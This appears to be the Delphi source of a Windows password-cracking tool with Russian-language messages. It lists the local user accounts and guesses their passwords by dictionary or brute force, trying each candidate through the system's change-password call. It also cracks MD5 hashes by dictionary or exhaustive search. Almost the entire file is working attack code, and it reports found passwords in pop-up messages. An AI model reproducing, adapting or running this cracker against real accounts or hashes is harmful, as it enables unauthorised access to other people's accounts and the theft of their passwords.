unit uMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, Buttons, ComCtrls, Hash, UsrAccess;

type
  TMainFrm = class(TForm)
    TopPanel: TPanel;
    Image12: TImage;
    Image13: TImage;
    Label17: TLabel;
    Label18: TLabel;
    Label19: TLabel;
    Label21: TLabel;
    Label8: TLabel;
    Bevel1: TBevel;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    OpenDialog1: TOpenDialog;
    ComboBox1: TComboBox;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    Label2: TLabel;
    Edit1: TEdit;
    SpeedButton1: TSpeedButton;
    ComboBox2: TComboBox;
    Label3: TLabel;
    Memo1: TMemo;
    Label10: TLabel;
    Edit2: TEdit;
    Label9: TLabel;
    Label7: TLabel;
    Label4: TLabel;
    Label1: TLabel;
    Label6: TLabel;
    Label5: TLabel;
    Bevel2: TBevel;
    Label12: TLabel;
    Label13: TLabel;
    Bevel3: TBevel;
    TabSheet3: TTabSheet;
    Edit3: TEdit;
    Label11: TLabel;
    SpeedButton2: TSpeedButton;
    Edit4: TEdit;
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
//////////////////////////////////////////////////////
//                      Types                       //
//////////////////////////////////////////////////////
type
  TAttackThread = class(TThread)
  private
    Procedure AttackDictonary;
    Procedure AttackDictonaryHash;
    Procedure AttackBruteForce;
    Procedure AttackBruteForceHash;
    Function  GetHash(Str: String): String;
  protected
    procedure Execute; override;
  public
  end;

type
  TTimerThread = class(TThread)
  private
    Procedure OneTik;
  protected
    procedure Execute; override;
  public
  end;

//////////////////////////////////////////////////////
var
  MainFrm: TMainFrm;

    //Thread's
    Attack          : TAttackThread;
    Timer           : TTimerThread;
    //Dictonary
    Dictonary       : TStringList;
    // Brute-force
    arrows          : array[1..12] of byte;
    exitf           : boolean;
    ip, j, k, MaxCount, PassLength : integer;
    pass            : shortstring;
    Chars           : shortstring;
    Stop            : Boolean;
    // Timer
    Old,New,Now     : integer;

//////////////////////////////////////////////////////

implementation

uses AboutFrm, Math;
//////////////////////////////////////////////////////
//                   Brute-Force                    //
//////////////////////////////////////////////////////
procedure Inc_Position(num : byte);
  begin
  exitf:=false;
  if (arrows[num] < Maxcount)
  then
     begin
       inc(arrows[num]) ;
       pass[PassLength+1-num] := chars[arrows[num]] ;
     end
    else
      begin
        arrows[num] := 1 ;
        pass[PassLength+1-num] := chars[1] ;
        if (num = PassLength)
        then
          begin
            exitf := TRUE ;
            exit;
          end
        else Inc_Position(num+1) ;
      end;
end;

Procedure BruteForceInit;
var
i,j: integer;
begin
  k:=1;
  for i:=0 to MainFrm.Memo1.Lines.Count-1 do
    for j:=1 to length(MainFrm.Memo1.Lines[i]) do
      begin
        Chars[k]:=MainFrm.Memo1.Lines[i][j];
        inc(k);
      end;
  MaxCount:=k-1;
  pass[0] := Chr(PassLength) ;
  for i := 1 to PassLength do
  begin
    arrows[i] := 0 ;
    pass[i] := #$20 ;
  end ;
  i:=0;
  Inc_Position(1) ;
end;

Function BruteForcePass: string;
begin
  inc(ip);
  Inc_Position(1);
  Result := pass;
end;
//////////////////////////////////////////////////////
//                   timer Thread                   //
//////////////////////////////////////////////////////

Procedure TTimerThread.Execute;
Begin
While 1=1 do OneTik;
end;

Procedure TTimerThread.OneTik;
Begin
New := strtoint(MainFrm.Label7.Caption);
Now := New - Old;
Old := New;
MainFrm.Label12.Caption := inttostr(Now);
Sleep(1000);
end;

//////////////////////////////////////////////////////
//                   Attack Thread                  //
//////////////////////////////////////////////////////

Procedure TAttackThread.execute;
begin
// User Acount's
MainFrm.PageControl1.UpdateControlState;
if MainFrm.PageControl1.TabIndex <> 2 then begin
MainFrm.PageControl1.UpdateControlState;
if MainFrm.ComboBox2.ItemIndex = 0 then begin
AttackDictonary;
end;
MainFrm.PageControl1.UpdateControlState;
if MainFrm.ComboBox2.ItemIndex = 1 then begin
PassLength := StrToInt(MainFrm.Edit2.Text);
AttackBruteForce;
end;
end;
// MD5
MainFrm.PageControl1.UpdateControlState;
if MainFrm.PageControl1.TabIndex = 2 then begin

  if MainFrm.ComboBox2.ItemIndex = 0 then
  AttackDictonaryHash;

  if MainFrm.ComboBox2.ItemIndex = 1 then begin
  PassLength := StrToInt(MainFrm.Edit2.Text);
  AttackBruteForceHash;
  end;
end;
// end..
Timer.Suspend;
end;

Function TAttackThread.GetHash(Str: String): String;
begin
Result := GetMD5Hash(Str);
end;

Procedure TAttackThread.AttackBruteForce;
var
ID,i        : integer;
uPass       : string;
uUser       : String;
begin
BruteForceInit;
i:=0;
uUser := MainFrm.ComboBox1.Text;
While exitf = False do begin
  uPass := BruteForcePass;
  ID:=StNetUserChangePassword('',uUser,uPass,uPass);
  MainFrm.Label4.Caption := uPass;
  MainFrm.Label7.Caption := inttostr(i);
  if ID = 0 then begin
    MainFrm.Label9.Caption := uPass;
    MessageBox(0,PChar('Пароль: '+uPass),'Пароль наиден!!! =)',0);
    Attack.Suspend;
  end;
  if exitf = true then begin
    MessageBox(0,'Пароль небыл наиден =(','Пароль ненаиден =(',0);
    Attack.Suspend;
  end;
  inc(i);
end;
end;

Procedure TAttackThread.AttackBruteForceHash;
var
ID,i        : integer;
uPass       : string;
uHash       : string;
uHPs        : string;
begin
BruteForceInit;
i:=0;
uPass := MainFrm.Edit3.Text;
While exitf = False do begin
    MainFrm.Label4.Caption := uHPs;
    MainFrm.Label7.Caption := inttostr(i);
    uHPs  := BruteForcePass;
    uHash := GetHash(uHPs);
    MainFrm.Edit4.Text := uHash;
    if uPass = uHash then begin
      MainFrm.Label9.Caption := uHPs;
      MessageBox(0,PChar('Пароль: '+uHPs),'Пароль наиден!!! =)',0);
      Attack.Suspend;
    end;
  if exitf = true then begin
    MessageBox(0,'Пароль небыл наиден =(','Пароль ненаиден =(',0);
    Attack.Suspend;
  end;
  inc(i);
end;
end;

Procedure TAttackThread.AttackDictonary;
var
Len,I,ID    : integer;
uPass       : string;
uUser       : String;
begin
  uUser := MainFrm.ComboBox1.Text;
  Len := Dictonary.Count-1;
  for i := 0 to Len do begin
    uPass := Dictonary.Strings[i];
    MainFrm.Label7.Caption := inttostr(i);
    MainFrm.Label4.Caption := uPass;
    ID := StNetUserChangePassword('',uUser,uPass,uPass);
    if ID = 0 then begin
      MainFrm.Label9.Caption := uPass;
      MessageBox(0,PChar('Пароль: '+uPass),'Пароль наиден!!! =)',0);
      Attack.Suspend;
    end;
end;
if i = len then begin
    MessageBox(0,'Пароль небыл наиден =(','Пароль ненаиден =(',0);
    Attack.Suspend;
end;
end;

Procedure TAttackThread.AttackDictonaryHash;
var
Len,I,ID    : integer;
uHash       : string;
uPass       : string;
begin
  Len := Dictonary.Count;
  uHash := MainFrm.Edit3.Text;
  for i := 0 to Len do begin
    MainFrm.Label7.Caption := inttostr(i);
    MainFrm.Label4.Caption := Dictonary.Strings[i];
    uPass := GetHash(Dictonary.Strings[i]);
    MainFrm.Edit4.text := uPass;
    if uPass = uHash then begin
      MainFrm.Label9.Caption := Dictonary.Strings[i];
      MessageBox(0,PChar('Пароль: '+Dictonary.Strings[i]),'Пароль наиден!!! =)',0);
      Attack.Suspend;
    end;
end;
if i = len then begin
    MessageBox(0,'Пароль небыл наиден =(','Пароль ненаиден =(',0);
    Attack.Suspend;
end;
end;
//////////////////////////////////////////////////////
{$R *.dfm}

procedure TMainFrm.Button1Click(Sender: TObject);
begin
Application.Terminate;
end;

procedure TMainFrm.FormCreate(Sender: TObject);
begin
Dictonary := TStringList.Create;
GetUserList(ComboBox1.Items);
end;

procedure TMainFrm.Button3Click(Sender: TObject);
begin

   Old := 0;
   New := 0;
   Now := 0;

   Label9.Caption := '--';

   if ComboBox2.ItemIndex = 0 then begin
      Dictonary.LoadFromFile(Edit1.Text);
   end;

   Attack := TAttackThread.Create(True);
   Attack.Resume;

   Timer  := TTimerThread.Create(True);
   Timer.Resume;

end;

procedure TMainFrm.Button4Click(Sender: TObject);
begin
Attack.Suspend;
Timer.Suspend;
end;

procedure TMainFrm.Button2Click(Sender: TObject);
begin
AboutForm.ShowModal;
end;

procedure TMainFrm.SpeedButton1Click(Sender: TObject);
begin
If OpenDialog1.Execute then Edit1.Text := OpenDialog1.FileName; 
end;

procedure TMainFrm.SpeedButton2Click(Sender: TObject);
var
S: String;
begin
S:=InputBox('String >> MD5','Введите строку для преобразования','Pass');
S:= GetMD5Hash(S);
Edit4.Text := S;
end;

end.
